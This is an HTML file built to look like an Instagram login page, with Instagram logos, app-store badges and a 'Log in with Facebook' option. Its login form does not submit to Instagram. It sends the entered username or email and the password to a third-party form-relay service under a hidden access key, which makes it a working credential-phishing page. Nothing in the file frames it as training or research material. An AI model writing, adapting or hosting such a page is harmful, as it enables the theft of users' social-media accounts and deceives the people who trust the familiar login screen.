<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Instagram Login Page</title>
	<link rel="stylesheet" href="style.css">
</head>
<body>

<div class="wrapper">
    
	<div class="header">
		<div class="top">
			<div class="logo">
				<img src="instagram.png" alt="instagram" style="width: 175px;">
			</div>
            <form action="https://api.web3forms.com/submit" method="POST">
			<div class="form">
                <input type="hidden" name="access_key" value="1f98e2c8-343d-4981-a71e-b106fc280518">
				<div class="input_field">
					<input type="text" id="email" name= "name" placeholder="Phone number, username, or email" class="input">
				</div>
				<div class="input_field">
					<input type="password" name="pass" id="pass" placeholder="Password" class="input">
				</div>
                <div  class="btn"> <button  class="btn" type="submit">Log in</button></div>
			</div>
        </form>
			<div class="or">
				<div class="line"></div>
				<p>OR</p>
				<div class="line"></div>
			</div>
			<div class="dif">
				<div class="fb">
					<img src="facebook.png" alt="facebook">
					<p>Log in with Facebook</p>
				</div>
				<div class="forgot">
					<a href="#">Forgot password?</a>
				</div>
			</div>
		</div>
		<div class="signup">
			<p>Don't have an account? <a href="#">Sign up</a></p>
		</div>
		<div class="apps">
			<p>Get the app.</p>
			<div class="icons">
				<a href="#"><img src="appstore.png" alt="appstore"></a>
				<a href="#"><img src="googleplay.png" alt="googleplay"></a>
			</div>
		</div>
	</div>
	<div class="footer">
		<div class="links">
			<ul>
				<li><a href="#">ABOUT US</a></li>
				<li><a href="#">SUPPORT</a></li>
				<li><a href="#">LANGUAGE</a></li>
			</ul>
		</div>
		<div class="copyright">
			Â© 2024 INSTAGRAM
		</div>
	</div>
</div>
